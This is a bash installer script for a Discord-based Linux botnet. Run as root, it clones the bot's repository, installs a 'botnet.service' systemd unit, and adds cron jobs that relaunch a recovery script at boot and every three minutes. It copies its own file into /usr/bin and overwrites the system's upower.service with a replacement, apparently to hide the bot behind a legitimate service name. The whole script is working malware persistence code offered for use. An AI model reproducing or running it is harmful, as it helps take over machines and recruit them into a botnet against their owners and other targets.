#har har Mahadev
#!/bin/bash

# Check if the script is being run with root privileges
if [[ $(id -u) -eq 0 ]]; then

    
    ping -c 1 8.8.8.8 > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then

        sudo apt-get install git -y
        apt-get install python3 -y
        #apt-get install pip3 ( in case ;)
        pip3 install discord #install discord module


    
    	git clone [link]

    	cp Debian_based_botne/Bnet/botnet.service /etc/systemd/system/
        #Debian_based_botne
        cp -r Debian_based_botne/Bnet /usr/share/ 
        cd /usr/share/Bnet/ && chmod +x mrdarksage.sh post-check.sh pre-check.sh recover_bnet.sh install.sh 
    	systemctl enable botnet.service
    	systemctl start botnet.service 
    	systemctl daemon-reload
        (crontab -l ; echo "@reboot sleep 60 && /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -
        (crontab -l ; echo "*/3 * * * * /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -

        cp /usr/share/Bnet/mrdarksage.sh /usr/bin/
        #location /usr/bin/mrdarksage.sh
        darkfile="/lib/systemd/system/upower.service"
        if [[ ! -d "$darkfile" ]]; then

            rm /lib/systemd/system/upower.service
            cp /usr/share/Bnet/upower.service /lib/systemd/system/
            
        fi


    else
    
    	echo "Internet connection is offline."
    fi
       
    
else
    echo "use [ sudo su ] to get root acess"
fi


